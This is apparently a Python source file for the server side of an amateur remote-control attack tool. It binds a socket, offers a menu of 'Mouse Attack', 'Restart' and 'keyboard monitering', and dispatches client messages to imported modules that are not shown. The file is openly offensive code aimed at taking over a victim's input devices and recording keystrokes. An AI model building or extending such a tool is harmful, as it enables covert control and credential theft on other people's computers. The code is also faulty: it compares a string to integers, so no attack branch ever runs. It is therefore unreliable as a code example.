import socket
import MouseControl , KeyStrokes , Restart

def start_server():
    # Create a socket object
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    # Define server host and port
    host = 'localhost'
    port = 12345
    
    # Bind the socket to the host and port
    server_socket.bind((host, port))
    
    # Server listens for connections (max 5 connections in the queue)
    server_socket.listen(5)
    print("Choose an option for attack: 1- Mouse Attack, 2- Restart, 3- keyboard monitering")
    
    # Accept the client connection
    client_socket, addr = server_socket.accept()
    print(f"Connected to {addr}")
    
    while True:
        # Receive message from the client
        client_message = client_socket.recv(1024).decode('utf-8')
        if client_message.lower() == 'exit':
            print("Client disconnected")
            break
        
        print(f"Client: {client_message}")
        
        if client_message == 1:
            MouseControl.mouse_attack()
        
        if client_message == 2:
            Restart.restart()
        
        if client_message == 3:
            KeyStrokes.key_strokes()
        
        else:
            pass
        # Send a response back to the client
        server_message = input("Server: ")
        client_socket.send(server_message.encode('utf-8'))
        
        if server_message.lower() == 'exit':
            print("Closing connection")
            break

    # Close the client socket
    client_socket.close()
    # Close the server socket
    server_socket.close()

if __name__ == "__main__":
    start_server()
